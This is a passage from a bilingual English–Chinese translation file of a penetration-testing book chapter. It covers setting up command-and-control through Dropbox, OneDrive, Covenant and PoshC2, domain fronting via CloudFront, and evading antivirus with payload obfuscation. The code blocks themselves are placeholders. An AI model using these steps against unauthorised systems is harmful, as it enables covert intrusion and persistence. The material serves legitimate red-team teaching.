  zh: 不幸的是，几乎所有Metasploit编码的可执行文件都可能被客户端防病毒软件或EDR软件检测到。这归因于渗透测试人员将加密的有效负载提交到VirusTotal等网站（[www.virustotal.com](http://www.virustotal.com)）。然而，你可以创建一个可执行文件，然后使用Veil-Evasion进行加密，具体描述见*第10章*，*利用*。
- en: Persistence using online file storage cloud services
  id: totrans-117
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用在线文件存储云服务来维持持久性
- en: Every organization that allows file sharing with cloud services is likely to
    make use of either Dropbox or OneDrive. Attackers can use these file storage services
    to maintain persistence on compromised systems.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 允许与云服务共享文件的每个组织可能会使用Dropbox或OneDrive。攻击者可以利用这些文件存储服务在受损系统上维持持久性。
- en: In this section, we will focus on using these file storage cloud services on
    the victim system and maintaining persistence to run C2 without having to disclose
    the attacker’s backend IP address by using the Empire PowerShell tool.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将重点介绍在受害者系统上使用这些文件存储云服务，并通过使用Empire PowerShell工具来维持持久性，以运行C2，而无需透露攻击者后端IP地址。
- en: Dropbox
  id: totrans-120
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Dropbox
- en: For companies using Dropbox, this listener serves as a highly reliable C2 channel.
    The `dbx` post-exploitation module is preloaded in our PowerShell Empire tool,
    which utilizes Dropbox infrastructure. Agents communicate with Dropbox, allowing
    it to be used as a C2 center.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 对于使用Dropbox的公司，此监听器可作为高度可靠的C2通道。我们的PowerShell Empire工具中预加载了`dbx`后渗透模块，利用Dropbox基础设施。代理与Dropbox通信，允许其用作C2中心。
- en: 'Follow these steps to set up a Dropbox stager:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 按照以下步骤设置Dropbox分段器：
- en: Create a Dropbox account.
  id: totrans-123
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 创建一个Dropbox账户。
- en: Go to My Apps on the Dropbox Developers site ([https://www.dropbox.com/developers](https://www.dropbox.com/developers)).
  id: totrans-124
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 前往Dropbox开发者网站的我的应用([https://www.dropbox.com/developers](https://www.dropbox.com/developers))页面。
- en: Go to **App Console** and click **Create App**.
  id: totrans-125
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入**应用控制台**，点击**创建应用**。
- en: Choose a **Scoped access New** API.
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择一个**Scoped access New** API。
- en: Set the type of access you need as **Full Dropbox– Access to all files and folders
    in a user’s Dropbox**.
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将需要的访问类型设置为**完全访问Dropbox – 可访问用户Dropbox中所有文件和文件夹**。
- en: Enter the name of the app, for example, `KaliC2C`, hit **Create app**, and tick
    the box to accept the terms and conditions.
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入应用程序的名称，例如，`KaliC2C`，点击**创建应用**，并勾选同意条款和条件。
- en: After the application is created, Dropbox should take us to the settings page.
    Before you generate the key, you need to navigate to the **Permissions** tab and
    ensure the write permissions are set by ticking **files.metadata.read**, **files.metadata.write**,
    **files.content.write**, and **files.content.read**.
  id: totrans-129
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应用程序创建后，Dropbox 应将我们带到设置页面。在生成密钥之前，您需要转到**权限**选项卡，并确保通过选中**files.metadata.read**、**files.metadata.write**、**files.content.write**和**files.content.read**来设置写入权限。
- en: Now we are all set to generate the token. Click on the **Settings** tab if you
    are in the **Permissions** tab from the previous step. In the **OAuth 2** section
    and the **Generated access token** heading, click on **Generate** and you should
    see Dropbox creating a new token, as seen in *Figure 13.8*:![](../Images/B17765_13_08.png)
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们已经准备好生成令牌。如果你在前一步骤的**权限**选项卡中，点击**设置**选项卡。在**OAuth 2**部分和**生成的访问令牌**标题下，点击**生成**，你应该看到
    Dropbox 正在创建一个新的令牌，如 *图 13.8* 所示：![](../Images/B17765_13_08.png)
- en: 'Figure 13.8: Generating the dropbox access token'
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.8：生成 Dropbox 访问令牌
- en: 'You can now use the generated access token to generate the payload on our Empire
    tool by running the following commands:'
  id: totrans-132
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 您现在可以通过运行以下命令在我们的 Empire 工具上使用生成的访问令牌生成有效载荷：
- en: '[PRE16]'
  id: totrans-133
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'The output should be as shown here:'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出应如此显示：
- en: '![](../Images/B17765_13_09.png)'
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_09.png)'
- en: 'Figure 13.9: Successfully creating the Dropbox listener in PowerShell Empire'
  id: totrans-136
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.9：在 PowerShell Empire 中成功创建 Dropbox 监听器
- en: 'If the API token is correct and everything works, the Dropbox account should
    now show a folder named `Empire`, with three subfolders called `results`, `staging`,
    and `taskings`, as shown in *Figure 13.10*:'
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果 API 令牌正确并且一切正常，Dropbox 账户现在应显示名为 `Empire` 的文件夹，其中包含名为 `results`、`staging`
    和 `taskings` 的三个子文件夹，如 *图 13.10* 所示：
- en: '![](../Images/B17765_13_10.png)'
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_10.png)'
- en: 'Figure 13.10: Folders generated within the Dropbox'
  id: totrans-139
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.10：在 Dropbox 内生成的文件夹
- en: Once the listener is up and running, attackers can utilize a number of methods
    to deliver the payload, for example, by running it from the existing Meterpreter
    session, by using social engineering, or by creating a scheduled task to report
    back every time the system boots.
  id: totrans-140
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦监听器启动运行，攻击者可以利用多种方法传递有效载荷，例如，通过从现有 Meterpreter 会话中运行，使用社会工程学，或创建一个定期任务以在系统启动时报告。
- en: 'Attackers can make use of any free file hosting service to store the payload
    and get the victim machines to download and execute the agent. A successful agent
    will report to Empire, as shown in *Figure 13.11*:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以利用任何免费的文件托管服务来存储有效载荷，并让受害机下载并执行代理程序。成功的代理程序将向 Empire 报告，如 *图 13.11* 所示：
- en: '![A screenshot of a computer  Description automatically generated with medium
    confidence](../Images/B17765_13_11.png)'
  id: totrans-142
  prefs: []
  type: TYPE_IMG
  zh: '![一台计算机的屏幕截图，自动生成的描述，中等置信度](../Images/B17765_13_11.png)'
- en: 'Figure 13.11: Successful interaction from the target to our listener using
    the Dropbox API'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.11：使用 Dropbox API 成功与我们的监听器进行交互
- en: Microsoft OneDrive
  id: totrans-144
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Microsoft OneDrive
- en: 'OneDrive is another popular file-sharing service, similar to Dropbox. In the
    latest version of Empire, you should be able to see an additional prebuilt listener,
    `onedrive`, as shown in *Figure 13.12*:'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: OneDrive 是另一个流行的文件共享服务，类似于 Dropbox。在 Empire 的最新版本中，您应该能够看到一个额外的预构建监听器 `onedrive`，如
    *图 13.12* 所示：
- en: '![](../Images/B17765_13_12.png)'
  id: totrans-146
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_12.png)'
- en: 'Figure 13.12: PowerShell Empire OneDrive listener options'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.12：PowerShell Empire OneDrive 监听器选项
- en: 'Set up the `onedrive` C2C as follows:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 设置 `onedrive` C2C 如下所示：
- en: Create a Microsoft developer account. Attackers can leverage the free account
    that Microsoft provides with credits and log in to the Azure portal ([https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade](https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade)).
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 创建一个 Microsoft 开发者账户。攻击者可以利用 Microsoft 提供的带有积分的免费账户登录 Azure 门户 ([https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade](https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade))。
- en: To register a new application, click on **New Registration** and enter your
    name and select **Accounts in any organizational directory (Any Azure AD directory
    - Multitenant) and personal Microsoft accounts (e.g. Skype, Xbox)**. Then, enter
    `https://login.live.com/oauth20_desktop.srf` with the redirect URI so that PowerShell
    Empire can authenticate using the offline desktop module, as shown in *Figure
    13.13*. Finally, click on **Register**:![](../Images/B17765_13_13.png)
  id: totrans-150
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要注册一个新应用程序，点击 **New Registration**，输入你的名称，并选择 **Accounts in any organizational
    directory (Any Azure AD directory - Multitenant) and personal Microsoft accounts
    (e.g. Skype, Xbox)**。然后，输入 `https://login.live.com/oauth20_desktop.srf` 作为重定向
    URI，这样 PowerShell Empire 就可以使用离线桌面模块进行认证，如*图 13.13*所示。最后，点击 **Register**：![](../Images/B17765_13_13.png)
- en: 'Figure 13.13: Registration of KaliC2C in Azure for offline authentication'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.13：在 Azure 中注册 KaliC2C 进行离线认证
- en: Once the application is created, attackers should be able to see a newly created
    Application ID, as shown here:![](../Images/B17765_13_14.png)
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦创建了应用程序，攻击者应该能够看到新创建的应用程序 ID，如下图所示：![](../Images/B17765_13_14.png)
- en: 'Figure 13.14: Client ID generation within the Azure portal'
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.14：在 Azure 门户中生成 Client ID
- en: Now that we have the `ClientID`, we will need to create a `ClientSecret`. Navigate
    to **Certificates & Sections** under the **Manage** section within the same page
    and, under **Client secrets**, click on **New client secret**. That should bring
    up another window, enter any description, by default, expiry should point to 6
    months, and finally click on **Add**. This should generate our Client Secret ID,
    as shown in *Figure 13.15*:![](../Images/B17765_13_15.png)
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们有了 `ClientID`，接下来需要创建 `ClientSecret`。在同一页面中的 **Manage** 部分下，导航到 **Certificates
    & Sections**，然后在 **Client secrets** 下点击 **New client secret**。这时会弹出另一个窗口，输入任何描述，默认情况下，过期时间为
    6 个月，最后点击 **Add**。这应该会生成我们的 Client Secret ID，如*图 13.15*所示：![](../Images/B17765_13_15.png)
- en: 'Figure 13.15: Creating a Secret ID for the ClientID'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.15：为 ClientID 创建 Secret ID
- en: Now, we are ready to fire up Empire and set up our listener. Set the `ClientID`
    to the Application ID from *step 3*, set the `ClientSecret` to the Secret ID value
    from *step 4*, and execute the listener, as shown in *Figure 13.16*:![](../Images/B17765_13_16.png)
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们准备启动 Empire 并设置我们的监听器。将 `ClientID` 设置为*第 3 步*中的应用程序 ID，将 `ClientSecret`
    设置为*第 4 步*中的 Secret ID 值，并执行监听器，如*图 13.16*所示：![](../Images/B17765_13_16.png)
- en: 'Figure 13.16: Configuring our PowerShell Empire with the ClientID and SecretValue
    that we created'
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.16：使用我们创建的 ClientID 和 SecretValue 配置 PowerShell Empire
- en: The URL can be opened in a browser to generate the authentication code. Testers
    should log in to the application and will prompt for permission to access the
    OneDrive files. Once you click **Yes**, then you should see the code generated
    in the URL, as shown in *Figure 13.17*:![](../Images/B17765_13_17.png)
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 可以在浏览器中打开 URL 以生成认证代码。测试者应登录到应用程序并会提示授权访问 OneDrive 文件。点击 **Yes** 后，你应该能看到 URL
    中生成的代码，如*图 13.17*所示：![](../Images/B17765_13_17.png)
- en: 'Figure 13.17: Authentication token generation in the browser'
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.17：浏览器中的认证令牌生成
- en: The code from the URL can now be used to set up the Empire listener, as follows:![](../Images/B17765_13_18.png)
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在可以使用来自 URL 的代码来设置 Empire 监听器，如下所示：![](../Images/B17765_13_18.png)
- en: 'Figure 13.18: Setting the AuthCode and starting the OneDrive listener'
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.18：设置 AuthCode 并启动 OneDrive 监听器
- en: Just as with Dropbox, you should now be able to see a folder named `Empire`
    with three subfolders, called `results`, `staging`, and `taskings`, in your OneDrive,
    with the correct Client ID and authentication code, as shown here:![](../Images/B17765_13_19.png)
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 就像 Dropbox 一样，现在你应该能够在 OneDrive 中看到一个名为 `Empire` 的文件夹，里面有三个子文件夹，分别是 `results`、`staging`
    和 `taskings`，并且具有正确的客户端 ID 和认证代码，如下图所示：![](../Images/B17765_13_19.png)
- en: 'Figure 13.19: Folders that are created in OneDrive once the listener started'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.19：启动监听器后在 OneDrive 中创建的文件夹
- en: Now you can stage the payload by running `usestager multi/launcher` and setting
    the `listener` to `onedrive` and then executing the payload. Once the payload
    is executed successfully on the target, this should listen on the OneDrive listener,
    as shown in *Figure 13.20*:![](../Images/B17765_13_20.png)
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，你可以通过运行 `usestager multi/launcher` 来准备有效载荷，并将 `listener` 设置为 `onedrive`，然后执行有效载荷。一旦有效载荷在目标上成功执行，它将监听
    OneDrive 监听器，如*图 13.20*所示：![](../Images/B17765_13_20.png)
- en: 'Figure 13.20: Agent successfully reporting back to the PowerShell Empire over
    the OneDrive API'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.20：代理通过 OneDrive API 成功报告回 PowerShell Empire
- en: Covenant
  id: totrans-166
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Covenant
- en: 'Attackers can also leverage the **Covenant C2** framework for penetration testing
    operations to maintain access to the target environment. This framework is written
    in .NET and is by Ryan Cobb of SpecterOps. This framework utilizes a majority
    of the open source features and plugins to perform different exploitations on
    the target with access. To install the Covenant C2 framework in Kali Linux, the
    following steps are involved:'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
- en: Download the repository by running `sudo git clone --recurse-submodules https://github.com/cobbr/Covenant`.
  id: totrans-168
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Since the tools heavily rely on the .NET framework, we will be downloading the
    Microsoft package to our Kali by running `sudo wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb
    -O packages-microsoft-prod.deb`.
  id: totrans-169
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once the deb file is downloaded, install the package by running `sudo dpkg -i
    packages-microsoft-prod.deb`.
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Covenant requires .NET version 3.1, so we will run the following dependencies
    to install the requirements by running `sudo apt-get update && sudo apt-get install
    -y apt-transport-https && sudo apt-get update && sudo apt-get install -y dotnet-sdk-3.1`.
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now we are ready to build the application by changing our folder to the project
    location, which is `cd Covenant/Covenant`, and run `sudo dotnet build` and `sudo
    dotnet run`.
  id: totrans-172
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If no errors are generated, then attackers should be able to see the following
    screen and be able to access Covenant on localhost on port `7443`:![](../Images/B17765_13_21.png)
  id: totrans-173
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.21: Covenant starting in Kali using dotnet'
  id: totrans-174
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the application is launched in the browser, you can create a username and
    password to log in.
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Similar to PowerShell Empire, Covenant provides options for the attackers to
    create the exploit payloads using listeners, launchers, templates, and tasks,
    where agents are referred to as grunts. The next step would be for attackers to
    create the listener and make sure that `ConnectAddresses` reflects the right IP
    address of the Kali Linux where the grunts can call back:![](../Images/B17765_13_22.png)
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.22: Configuring the Covenant connect back address'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Finally, generate the exploit payload by navigating to the launchers and selecting
    any of the options; for example, we have selected PowerShell Launcher. The tool
    should present you with the following figure and options. Upon selecting the right
    listeners, you should be able to generate a payload that is both encoded and non-encoded:![](../Images/B17765_13_23.png)
  id: totrans-178
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.23: Setting the right listener and generating the payload in the
    PowerShell Launcher section'
  id: totrans-179
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the payload is executed at the target, that should allow us to interact
    from the Covenant C2, as seen in *Figure 13.24*:![](../Images/B17765_13_24.png)
  id: totrans-180
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.24: Indication of victim connecting the Covenant C2'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We can now interact with the target by navigating to **Grunts** in the main
    menu and clicking on **Interact** to run pre-loaded scripts that can be run on
    the target device, as seen in *Figure 13.25*:![](../Images/B17765_13_25.png)
  id: totrans-182
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.25: Interacting with the target using the Covenant Interact section'
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: If there are two or three testers on the same target, they would be able to
    see all the tasks performed by clicking on the **Taskings** tab.
  id: totrans-184
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Covenant allows testers to leverage all the post-exploit and lateral movement
    modules within the tool during penetration testing to capture the crown jewels
    or to exfiltrate confidential database files.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
- en: PoshC2
  id: totrans-186
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: One other C2 that pen testers can also leverage is PoshC2\. It is a proxy-aware
    C2 framework that comes in very handy for post-exploitation and lateral movement.
    The tool is written in Python3, and the latest version as of December 2021 is
    7.4.0\. The tool has gone through significant improvements over the years.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
- en: It is possible to add your own modules and tools. By default, the PoshC2 installation
    comes with PowerShell, C#, Python3, C++, DLLs, and shellcode. The exploit payloads
    injected within PoshC2 are called implants. These implants work on pretty much
    all operating systems, including Windows, *nix, and OSX.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
- en: 'The following are the steps involved in successfully setting up a PoshC2 on
    Kali Linux:'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
- en: Download the application by running `git clone --recursive` ([https://github.com/nettitude/PoshC2](https://github.com/nettitude/PoshC2))
    and `cd PoshC2` and run `sudo ./Install.sh`.
  id: totrans-190
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Testers may receive an error message relating to the dotnet; however, that does
    not stop the application from running.
  id: totrans-191
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Set up a new project by running `sudo posh-project –n nameoftheproject`.
  id: totrans-192
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once the project is set up, configure the C2 server by editing the configuration
    file located at `/var/Poshc2/<nameoftheproject>/configure.yml` and edit the right
    `PayloadCommsHost` to the right IP address or domain name. You can also choose
    to enter the domain’s front header (we will learn how to use the domain front
    in the next section).
  id: totrans-193
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Finally, run the C2 server by running `sudo posh-server` in the terminal and
    you should be able to see the confirmation as seen in *Figure 13.26*, with all
    the payloads and their relevant location details:![](../Images/B17765_13_26.png)
  id: totrans-194
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.26: Successfully launching the PoshC2 server'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the payload is executed on the target, attackers can connect to the PoshC2
    server by running `sudo posh –u <username>` in the Kali Linux terminal. They should
    be able to see the implant reporting to the server as seen in *Figure 13.27*.
    Similar to Metasploit, pen testers can now use the number of the implant to interact
    with the target:![](../Images/B17765_13_27.png)
  id: totrans-196
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.27: Target reporting to the PoshC2 server as an implant'
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Although the majority of antivirus/EDR software can detect the payload, attackers
    can always leverage tools such as `PyFuscator` to scramble the payload for PowerShell,
    successfully evade detection, and quickly migrate to a legitimate process.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
- en: Domain fronting
  id: totrans-199
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Domain fronting is a technique engaged by attackers or red teams to avoid detection
    of their C2 servers. It is the art of hiding the attacker’s machine behind highly
    trusted domains by routing the traffic through an application utilizing someone
    else’s domain name (or, in the case of HTTPS, someone else’s SSL certificate).
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
- en: The most popular services include Amazon’s CloudFront, Microsoft Azure, and
    Google App Engine. The same domain fronting techniques can be used on corporate
    webmail for C2 and data exfiltration through SMTP protocols.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
- en: Note that Google and Amazon both implemented strategies to guard against domain
    fronting in April 2018\. In this section, we will explore how to use Amazon CloudFront
    and Microsoft Azure for C2, using two different methods.
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
- en: Using Amazon CloudFront for C2
  id: totrans-203
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'In order to improve download speed, Amazon provides a **content delivery network**
    (**CDN**) on a globally distributed network of proxy servers that caches content
    such as bulky media and videos. Amazon CloudFront is a CDN offered by Amazon Web
    Services. The following steps are involved in creating a CDN:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
- en: Firstly, open an AWS account at [https://aws.amazon.com/](https://aws.amazon.com/)
  id: totrans-205
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Log in to your account at [https://console.aws.amazon.com/cloudfront/home](https://console.aws.amazon.com/cloudfront/home)
  id: totrans-206
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Click **Get Started** under **Web** and select **Create distribution**.
  id: totrans-207
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Fill in the correct details for each setting:'
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Origin Domain Name**: The domain name controlled by the attacker.'
  id: totrans-209
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Origin Path**: The value can be set to the root, `/`.'
  id: totrans-210
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Origin Path ID****:** Any custom name, such as demo or C2C.'
  id: totrans-211
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Origin SSL Protocols**: By default, `TLS v1.2`, `TLS v1.1` and `TLS v1.0`
    are enabled.'
  id: totrans-212
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Origin Protocol Policy**: There are three options: **HTTP**, **HTTPS**, and
    **Match Viewer**. I recommend using **Match Viewer**, which utilizes both **HTTPS**
    and **HTTP** depending on the protocol of the viewer’s request.'
  id: totrans-213
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Allowed HTTP Methods**: Select **GET**, **HEAD**, **OPTIONS, PUT,** **POST**,
    **PATCH**, **DELETE** in the **Default Cache** behavior settings.'
  id: totrans-214
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Ensure for **Cache and origin request settings** that you select **Use legacy
    cache settings**.
  id: totrans-215
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Ensure **Forward Cookies** is set to **All**.
  id: totrans-216
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Ensure **Query String Forwarding and Caching** is set to **Forward all, Cache
    based on all**.![](../Images/B17765_13_28.png)
  id: totrans-217
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Figure 13.28: Enabling the legacy cache settings and selecting the right options
    in AWS'
  id: totrans-218
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now you’re all set, so click **Create Distribution**. You should see the following
    screen, with the domain name showing as `<somerandom>.cloudfront.net`:![](../Images/B17765_13_29.png)
  id: totrans-219
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.29: Successfully creating a cloud front distribution'
  id: totrans-220
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: It normally takes around 5 minutes or less to bring up the distribution.
  id: totrans-221
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the distribution is created on AWS, you’re ready to customize the PoshC2
    agent to prepare for the attack. Before we fire up the PoshC2, we need to ensure
    that we identify a vulnerable domain that can be fronting our evil server.
  id: totrans-222
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Finding frontable domains can be achieved using various scripts; here, we will
    use the script found at [https://github.com/rvrsh3ll/FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains),
    and use one of the vulnerable hosts to perform the attack.
  id: totrans-223
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Let’s now go ahead and create a new listener in PoshC2\. The first step is to
    create a PoshC2 project by running `posh-project –n domfront` and then make changes
    to the configuration file by locating to `/var/poshc2/domfront/config.yml` and
    editing `PayLoadCommsHost` to the vulnerable host, `DomainFrontHeader` to your
    AWS cloud distribution hostname, and then `BindPort` to `80`, as seen in *Figure
    13.30*:![Text  Description automatically generated](../Images/B17765_13_30.png)
  id: totrans-224
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.30: Configuring the PoshC2 to run on port 80 along with the domain
    front header with a vulnerable host'
  id: totrans-225
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Attackers can choose to run the C2 on port `443`. Ensure that you create the
    right certificate by using services such as Letsencrypt, or the CloudFront CDN
    will not be able to establish communication with the C2 server.
  id: totrans-226
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once all the settings are complete for our PoshC2, attackers should be able
    to see the following:![](../Images/B17765_13_31.png)
  id: totrans-227
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.31: Launching PoshC2 using the AWS cloud distribution that we created'
  id: totrans-228
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: In this example, we will use the `vijayvelu.com` host to forward the domain
    request to our C2 server. Before connecting to Amazon Web Services, the application
    will perform a DNS lookup to resolve the domain name to a network IP address.
    The request will go directly to the `vijayvelu.com` host with the host header
    that we created in the Amazon CloudFront distribution.
  id: totrans-229
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'A packet capture of the request from Wireshark will look similar to *Figure
    13.32*:'
  id: totrans-230
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_32.png)'
  id: totrans-231
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: 'Figure 13.32: TCP stream of the communication of DomainFrontHost to our hosting
    server'
  id: totrans-232
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the payload is executed on the victim machine, you should now be able to
    see the implant reporting without any trace of the attacker’s IP address on the
    victim network. All the traffic will look like legitimate connections to AWS and
    the domain that is fronted:![](../Images/B17765_13_33.png)
  id: totrans-233
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 13.33: Successful implanting of the exploit to the target with domain
    fronting'
  id: totrans-234
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Attackers can also leverage Metasploit. We will create an exploit to provide
    a Meterpreter reverse HTTP shell using `msfvenom`, with the domain that does the
    forwarding, with our header injection as follows:'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  id: totrans-236
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'Execution of this payload should get a reverse shell on the C2 server that
    is behind the Amazon CDN. This technique was actively utilized by APT29 (a Russian
    nation-state hacking group) to perform covert attacks:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_34.png)Figure 13.34: Reverse shell to Meterpreter when
    the exploit was run on the target system using the domain fronting technique'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
